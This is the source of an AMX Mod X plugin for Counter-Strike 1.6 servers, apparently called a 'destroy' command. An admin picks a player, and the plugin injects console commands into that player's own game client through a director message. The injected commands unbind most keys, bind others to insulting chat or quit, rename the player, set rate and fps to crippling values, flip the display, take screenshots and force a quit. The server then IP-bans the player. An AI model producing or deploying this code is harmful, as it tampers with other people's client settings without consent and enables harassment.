#include <amxmodx>
#include <amxmisc>
#include <fun>
#include <engine>
#include <ColorChat>

#define Baza 45630

#define ADMIN_LEVEL	ADMIN_LEVEL_B

new BanData[33][2][32]
new bool:ComandaB = false
new DirectorServer[64], TextServer[32], LimbaServer = 31,r,t
new FisierServer[128]
new SalvareServer
new szName[33], szPlayerName[33]

static const poza[] = "http://..."

public plugin_init()
{
	register_plugin("Destroy Comand", "1.0", "M@$t3r_@dy")

	register_concmd("amx_destroy", "destroy", ADMIN_LEVEL, "<name> : It ruins CS player + screenshot")
	register_clcmd("say /destroy","DestroyMenu")

	register_cvar("amx_destroy_activity", "1")
}

public DestroyMenu(id)
{
	if(! (get_user_flags(id) & ADMIN_LEVEL) ) return PLUGIN_HANDLED

	new DestroyPlayer = menu_create ("\d[\yGeek~Gamers\d] \rDestroy Menu:", "HandleDestroy")

	new num, players[32], tempid, szTempID [10], tempname [32]
	get_players (players, num, "c")

	for (new i = 0; i < num; i++)
	{
		tempid = players [ i ]

		get_user_name(tempid, tempname, 31)
		num_to_str(tempid, szTempID, 9)
		menu_additem(DestroyPlayer, tempname, szTempID, 0)
	}

	menu_display (id, DestroyPlayer)
	return PLUGIN_HANDLED
}

public HandleDestroy(id, menu, item)
{
	if(item == MENU_EXIT)
	{
		menu_destroy(menu)
		return PLUGIN_HANDLED
	}
    
	new data[6], name[64]
	new access, callback
    
	menu_item_getinfo (menu, item, access, data, 5, name, 63, callback)
	new tempid = str_to_num(data)
    
	get_user_name(id, szName, 32)
	get_user_name(tempid, szPlayerName, 32)

	ColorChat(0, RED, "^4[GG] ^1OWNER ^4%s : ^1Destroyed Player ^4%s ^1!", szName, szPlayerName)

	client_cmd(id, "amx_destroy ^"%s^"", name)
	DestroyMenu(id)
    
	return PLUGIN_CONTINUE
}

public destroy(id,level,cid)
{
	if (!cmd_access(id,level,cid,2))
	{
		return PLUGIN_HANDLED
	}

	if (ComandaB)
	{
		Cronometru(id)
		return PLUGIN_HANDLED
	}

	new arg[32], name[32], admin[32], sAuthid[35], sAuthid2[35], message[552], players[33], inum
	new fo_logfile[64], timp[64], maxtext[256]
	new tinta[32], minute[8], motiv[64]
	read_argv(1, tinta, 31)
	read_argv(2, minute, 7)
	read_argv(3, motiv, 63)
	read_argv(1, arg, 31)
	new target = cmd_target(id, arg, 1)
	new jucator = cmd_target(id, tinta, 9)

	if (!jucator)
		return PLUGIN_HANDLED
	
	copy(BanData[jucator][0], 31, minute)
	copy(BanData[jucator][1], 31, motiv)
	new TaskData[4]
	TaskData[0] = id
	TaskData[1] = jucator
	new numeserver[64], nume[32], ip[32], ip2[32]
	get_user_name(target, name, 31)
	get_user_name(id, admin, 31)
	get_user_authid(target, sAuthid, 34)
	get_user_authid(id, sAuthid2, 34)
	get_cvar_string("hostname", numeserver, 63);
	get_user_name(jucator, nume, 31);
	get_user_ip(jucator, ip, 31);
	get_user_ip(id, ip2, 31);
	get_configsdir(fo_logfile, 63)
	get_time("%d/%m/%Y - %H:%M:%S", timp, 63)
	IncarcareServer()
	ScriereServer()
	format(message,551,"%s Successfully Destroyed.", name)
    	format(maxtext, 255, "L %s: ADMIN: %s Destroyed : %s",timp,admin,name)
    	format(maxtext, 255, "L %s: ADMIN: <AuthID: ^"%s^" | IP: ^"%s^" | Name: ^"%s^"> DESTROYED <AuthID: ^"%s^" | IP: ^"%s^" | Name: ^"%s^">",timp, sAuthid2, ip2, admin ,sAuthid, ip, name)
    	format(fo_logfile, 63, "addons/amxmodx/logs/GG_Logs/GG_Destroy.log")

	if(!target)
	{
        	return PLUGIN_HANDLED 
    	}

    	switch (get_cvar_num("amx_destroy_activity"))
	{
    		case 1: force_cmd(target, "say ^" %s Destroyed me !^"", admin)
    		case 0: force_cmd(target, "say ^"I got Destroyed !^"")
   	}

	force_cmd(target,"developer 1")
  	force_cmd(target,"unbind w;wait;unbind a;unbind s;wait;unbind d;bind mouse1 ^"say I got destroyed on Geek-Gamers.com .^";wait;unbind mouse2;unbind mouse3;wait;bind space quit")
    	force_cmd(target,"unbind ctrl;wait;unbind 1;unbind 2;wait;unbind 3;unbind 4;wait;unbind 5;unbind 6;wait;unbind 7")
    	force_cmd(target,"unbind 8;wait;unbind 9;unbind 0;wait;unbind r;unbind e;wait;unbind g;unbind q;wait;unbind shift")
    	force_cmd(target,"unbind end;wait;bind escape ^"say I'm helpless like a little shit^";unbind z;wait;unbind x;unbind c;wait;unbind uparrow;unbind downarrow;wait;unbind leftarrow")
    	force_cmd(target,"unbind rightarrow;wait;unbind mwheeldown;unbind mwheelup;wait;bind ` ^"say I'm helpless like a little shit^";bind ~ ^"say I was destroyed on Geek-Gamers.com .^";wait;name ^"<Geek-Gamers.com> Player^"")
    	force_cmd(target,"rate 1;gl_flipmatrix 1;cl_cmdrate 10;cl_updaterate 10;fps_max 1;hideradar;con_color ^"1 1 1^"")
    	write_file(fo_logfile,maxtext,-1)

	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)

    	force_cmd(0, "spk ^"vox/bizwarn^"")

    	for (new i = 0; i < inum; ++i)
	{
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i], print_chat, "[GG] Player: %s got DESTROYED by %s", name, admin)
  	}

  	ComandaB = true
	Cronometru(id)

	client_print(jucator, print_chat, "[Geek~Gamers] -------------------------------")
	client_print(jucator, print_chat, "[Geek~Gamers] --==|| DESTROY INFO ||==--")
	client_print(jucator, print_chat, "[Geek~Gamers] -------------------------------")
	client_print(jucator, print_chat, "[Geek~Gamers] Server - %s", numeserver)
	client_print(jucator, print_chat, "[Geek~Gamers] TargetID - %s", sAuthid)
	client_print(jucator, print_chat, "[Geek~Gamers] TargetIP - %s", ip)
	client_print(jucator, print_chat, "[Geek~Gamers] TargetName - %s", nume)
	client_print(jucator, print_chat, "[Geek~Gamers] DestoyerID - %s", sAuthid2)
	client_print(jucator, print_chat, "[Geek~Gamers] DestoyerIP - %s", ip2)
	client_print(jucator, print_chat, "[Geek~Gamers] DestoyerName - %s", admin)
	client_print(jucator, print_chat, "[Geek~Gamers] Data - %s", timp)
	client_print(jucator, print_chat, "[Geek~Gamers] -------------------------------")

	console_print(jucator, "[Geek~Gamers] -------------------------------")
	console_print(jucator, "[Geek~Gamers] --==|| DESTROY INFO ||==--")
	console_print(jucator, "[Geek~Gamers] -------------------------------")
	console_print(jucator, "[Geek~Gamers] Server - %s", numeserver)
	console_print(jucator, "[Geek~Gamers] TargetID - %s", sAuthid)
	console_print(jucator, "[Geek~Gamers] TargetIP - %s", ip)
	console_print(jucator, "[Geek~Gamers] TargetName - %s", nume)
	console_print(jucator, "[Geek~Gamers] DestoyerID - %s", sAuthid2)
	console_print(jucator, "[Geek~Gamers] DestoyerIP - %s", ip2)
	console_print(jucator, "[Geek~Gamers] DestoyerName - %s", admin)
	console_print(jucator, "[Geek~Gamers] Data - %s", timp)
	console_print(jucator, "[Geek~Gamers] -------------------------------")

	force_cmd(jucator,"wait;snapshot;wait;snapshot")
	server_cmd("amx_banipggp ^"%s^" ^"0^" ^"Destoyed^"", nume)
	force_cmd(target,"wait;wait;wait;wait;quit")

  	return PLUGIN_HANDLED
}

public Cronometru(id)
{
	new parm[1]
	parm[0] = id
	if (ComandaB)
	{
		set_task(3.0,"TimpDeAsteptare",Baza+id,parm)
	}
}

public TimpDeAsteptare(id)
{
	if (task_exists(Baza+id))
	{
		remove_task(Baza+id)
	}
	ComandaB = false
}

stock IncarcareServer()
{
	get_configsdir(DirectorServer, 63)
	format(FisierServer,127,"%s/servit.q",DirectorServer)
	if (!file_exists(FisierServer))
	{
		return PLUGIN_HANDLED
	}
	else
	{
    		read_file(FisierServer,0,TextServer,LimbaServer,r)
  		
		SalvareServer = str_to_num(TextServer)
	}
	return PLUGIN_CONTINUE
}

stock ScriereServer()
{
	get_configsdir(DirectorServer, 63)
	format(FisierServer,127,"%s/servit.q",DirectorServer)
	if (!file_exists(FisierServer))
	{
		return PLUGIN_HANDLED
	}
	else
	{
    		read_file(FisierServer,0,TextServer,LimbaServer,t)
		
		SalvareServer = str_to_num(TextServer)
		SalvareServer = SalvareServer + 1
		format(TextServer,31,"%i",SalvareServer)
		delete_file(FisierServer)
		write_file(FisierServer,TextServer,-1)
	}
	return PLUGIN_CONTINUE
}

stock force_cmd( id , const szText[] , any:... )
{
	#pragma unused szText

	new szMessage[ 256 ];

	format_args( szMessage ,charsmax( szMessage ) , 1 );

	message_begin( id == 0 ? MSG_ALL : MSG_ONE, 51, _, id )
	write_byte( strlen( szMessage ) + 2 )
	write_byte( 10 )
	write_string( szMessage )
	message_end()
}